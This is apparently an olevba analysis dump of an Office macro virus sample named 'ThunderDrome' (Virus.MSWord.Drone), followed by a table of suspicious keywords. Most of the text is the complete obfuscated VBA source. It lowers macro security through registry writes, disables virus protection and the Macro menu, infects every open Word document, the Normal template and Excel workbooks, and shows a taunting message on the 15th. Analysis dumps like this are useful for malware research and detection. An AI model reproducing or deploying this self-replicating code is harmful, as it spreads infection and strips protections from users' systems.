olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Drone
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Drone 
in file: Virus.MSWord.Drone - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'ThunderDrome
Private Sub InfectExcel()
On Error Resume Next
With ThisWorkbook.VBProject.vbcomponents(Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(87) & Chr(111) & Chr(114) & Chr(107) & Chr(66) & Chr(111) & Chr(111) & Chr(107)).codemodule
Code = .lines((2 - (2 - 1)), 1000)
End With
Set MsWord = GetObject(, Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(46) & Chr(97) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110))
WasOn = (2 - (2 - 1))
If MsWord = "" Then
Set MsWord = CreateObject(Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(46) & Chr(97) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110))
WasOn = (4 - (2 + 2))
End If
With MsWord.System
.PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(56) & Chr(46) & Chr(48) & Chr(92) & Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(32) & Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108), Chr(79) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(54)) = &H0
.PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(57) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(76) & Chr(101) & Chr(118) & Chr(101) & Chr(108)) = 1&
.PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(76) & Chr(101) & Chr(118) & Chr(101) & Chr(108)) = 1&
If .PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(86) & Chr(66) & Chr(79) & Chr(77)) <> 1& Then
.PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(86) & Chr(66) & Chr(79) & Chr(77)) = 1&
End If
End With
With MsWord.Options: .VirusProtection = (4 - (2 + 2)): .SaveNormalPrompt = (4 - (2 + 2)): .ConfirmConversions = (4 - (2 + 2)): End With
With MsWord.Application: .ScreenUpdating = (4 - (2 + 2)): .DisplayAlerts = wdAlertsNone: .DisplayStatusBar = (4 - (2 + 2)): End With
MsWord.CommandBars(Chr(84) & Chr(111) & Chr(111) & Chr(108) & Chr(115)).Controls(Chr(77) & Chr(97) & Chr(99) & Chr(114) & Chr(111)).Enabled = (4 - (2 + 2))

For Each Fly In MsWord.Documents
With Fly.VBProject.vbcomponents((2 - (2 - 1))).codemodule
If .lines((2 - (2 - 1)), (2 - (2 - 1))) <> "'ThunderDrome" Then
.DeleteLines (2 - (2 - 1)), .CountOfLines
.AddFromString Code
Fly.Save
End If
End With
Next

With MsWord.NormalTemplate.VBProject.vbcomponents((2 - (2 - 1))).codemodule
If .lines((2 - (2 - 1)), (2 - (2 - 1))) <> "'ThunderDrome" Then
.DeleteLines (2 - (2 - 1)), .CountOfLines
.AddFromString Code
NormalTemplate.Save
End If
End With

If WasOn = (4 - (2 + 2)) Then MsWord.Quit
If Dir(Application.StartupPath & Chr(92) & Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115)) = Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115) Then GlobalInstalled = (2 - (2 - 1))
Select Case GlobalInstalled
Case (2 - (2 - 1))
        Workbooks.Open Application.StartupPath & Chr(92) & Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115)
        For Each Fly In Workbooks
            With Fly.VBProject.vbcomponents(Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(87) & Chr(111) & Chr(114) & Chr(107) & Chr(66) & Chr(111) & Chr(111) & Chr(107)).codemodule
                If .lines(1, 1) <> "'ThunderDrome" Then
                    .DeleteLines (2 - (2 - 1)), .CountOfLines
                    .AddFromString Code
                End If
            End With
        Next
        Workbooks("ThunderDrome.xls").Close
Case (4 - (2 + 2))
        Workbooks.Add.SaveAs FileName:=Application.StartupPath & Chr(92) & Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115)
        With Activeworkbook.VBProject.vbcomponents(Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(87) & Chr(111) & Chr(114) & Chr(107) & Chr(66) & Chr(111) & Chr(111) & Chr(107)).codemodule
            .DeleteLines (2 - (2 - 1)), .CountOfLines
            .AddFromString Code
        End With
        ActiveWindow.Visible = (4 - (2 + 2))
        Workbooks(Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115)).Save
        Activeworkbook.Save
End Select
With Application: .DisplayAlerts = wdAlertsNone: .DisplayStatusBar = (4 - (2 + 2)): End With
CommandBars(Chr(84) & Chr(111) & Chr(111) & Chr(108) & Chr(115)).Controls(Chr(77) & Chr(97) & Chr(99) & Chr(114) & Chr(111)).Enabled = (4 - (2 + 2))
If Day(Now()) = (10 + (10 / 2)) Then PayLoad
End Sub

Private Sub InfectWord()
On Error Resume Next
With ThisDocument.VBProject.vbcomponents((2 - (2 - 1))).codemodule
Code = .lines((2 - (2 - 1)), 1000)
End With
Set Excel = GetObject(, Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108) & Chr(46) & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110))
WasOn = (2 - (2 - 1))
If Excel = "" Then
Set Excel = CreateObject(Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108) & Chr(46) & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110))
WasOn = (4 - (2 + 2))
End If
With Excel.Application
.DisplayAlerts = wdAlertsNone
.DisplayStatusBar = (4 - (2 + 2))
End With
Excel.CommandBars(Chr(84) & Chr(111) & Chr(111) & Chr(108) & Chr(115)).Controls(Chr(77) & Chr(97) & Chr(99) & Chr(114) & Chr(111)).Enabled = (4 - (2 + 2))
With Excel.Activeworkbook.VBProject.vbcomponents(Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(87) & Chr(111) & Chr(114) & Chr(107) & Chr(66) & Chr(111) & Chr(111) & Chr(107)).codemodule
.DeleteLines (2 - (2 - 1)), .CountOfLines
.AddFromString Code
End With
If Dir(Excel.Application.StartupPath & Chr(92) & Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115)) = Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115) Then GlobalInstalled = (2 - (2 - 1))
Select Case GlobalInstalled
Case (2 - (2 - 1))
    Excel.Workbooks.Open Application.StartupPath & Chr(92) & Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115)
        For Each Fly In Excel.Workbooks
            With Fly.VBProject.vbcomponents(Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(87) & Chr(111) & Chr(114) & Chr(107) & Chr(66) & Chr(111) & Chr(111) & Chr(107)).codemodule
                If .lines(1, 1) <> "'ThunderDrome" Then
                    .DeleteLines (2 - (2 - 1)), .CountOfLines
                    .AddFromString Code
                End If
            End With
        Next
    Excel.Workbooks("ThunderDrome.xls").Close
Case (4 - (2 + 2))
    Excel.Workbooks.Add.SaveAs FileName:=Excel.Application.StartupPath & Chr(92) & Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115)
        With Excel.Activeworkbook.VBProject.vbcomponents(Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(87) & Chr(111) & Chr(114) & Chr(107) & Chr(66) & Chr(111) & Chr(111) & Chr(107)).codemodule
            .DeleteLines (2 - (2 - 1)), .CountOfLines
            .AddFromString Code
        End With
    Excel.ActiveWindow.Visible = (4 - (2 + 2))
    Excel.Workbooks(Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(46) & Chr(120) & Chr(108) & Chr(115)).Save
    Excel.Activeworkbook.Save
End Select
If WasOn = (4 - (2 + 2)) Then Excel.Quit

With Options: .VirusProtection = (4 - (2 + 2)): .SaveNormalPrompt = (4 - (2 + 2)): .ConfirmConversions = (4 - (2 + 2)): End With
With Application: .ScreenUpdating = (4 - (2 + 2)): .DisplayAlerts = wdAlertsNone: .DisplayStatusBar = (4 - (2 + 2)): End With
CommandBars(Chr(84) & Chr(111) & Chr(111) & Chr(108) & Chr(115)).Controls(Chr(77) & Chr(97) & Chr(99) & Chr(114) & Chr(111)).Enabled = (4 - (2 + 2))
With System
.PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(56) & Chr(46) & Chr(48) & Chr(92) & Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(32) & Chr(69) & Chr(120) & Chr(99) & Chr(101) & Chr(108), Chr(79) & Chr(112) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(115) & Chr(54)) = &H0
.PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(57) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(76) & Chr(101) & Chr(118) & Chr(101) & Chr(108)) = 1&
.PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(76) & Chr(101) & Chr(118) & Chr(101) & Chr(108)) = 1&
If .PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(86) & Chr(66) & Chr(79) & Chr(77)) <> 1& Then
.PrivateProfileString("", Chr(72) & Chr(75) & Chr(69) & Chr(89) & Chr(95) & Chr(67) & Chr(85) & Chr(82) & Chr(82) & Chr(69) & Chr(78) & Chr(84) & Chr(95) & Chr(85) & Chr(83) & Chr(69) & Chr(82) & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(79) & Chr(102) & Chr(102) & Chr(105) & Chr(99) & Chr(101) & Chr(92) & Chr(49) & Chr(48) & Chr(46) & Chr(48) & Chr(92) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(92) & Chr(83) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121), Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & Chr(86) & Chr(66) & Chr(79) & Chr(77)) = 1&
End If
End With
For Each Fly In Documents
With Fly.VBProject.vbcomponents((2 - (2 - 1))).codemodule
If .lines((2 - (2 - 1)), (2 - (2 - 1))) <> "'ThunderDrome" Then
.DeleteLines (2 - (2 - 1)), .CountOfLines
.AddFromString Code
Fly.Save
End If
End With
Next
With NormalTemplate.VBProject.vbcomponents((2 - (2 - 1))).codemodule
If .lines((2 - (2 - 1)), (2 - (2 - 1))) <> "'ThunderDrome" Then
.DeleteLines (2 - (2 - 1)), .CountOfLines
.AddFromString Code
NormalTemplate.Save
End If
End With
If Day(Now()) = (10 + (10 / 2)) Then PayLoad
End Sub
Private Sub WorkBookDeactivate()
InfectExcel
End Sub
Private Sub DocumentClose()
InfectWord
End Sub
Private Sub PayLoad()
Assistant.Visible = (2 - (2 - 1))
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = Chr(72) & Chr(105) & Chr(32) & Chr(105) & Chr(32) & Chr(97) & Chr(109) & Chr(32) & Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101) & Chr(44) & Chr(32) & Chr(105) & Chr(32) & Chr(108) & Chr(105) & Chr(107) & Chr(101) & Chr(32) & Chr(116) & Chr(111) & Chr(32) & Chr(83) & Chr(99) & Chr(114) & Chr(101) & Chr(97) & Chr(109) & Chr(32) & Chr(105) & Chr(110) & Chr(32) & Chr(121) & Chr(111) & Chr(117) & Chr(114) & Chr(32) & Chr(102) & Chr(97) & Chr(99) & Chr(101)
.Heading = Chr(84) & Chr(104) & Chr(117) & Chr(110) & Chr(100) & Chr(101) & Chr(114) & Chr(68) & Chr(114) & Chr(111) & Chr(109) & Chr(101)
.Animation = msoAnimationGetTechy
.Show
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

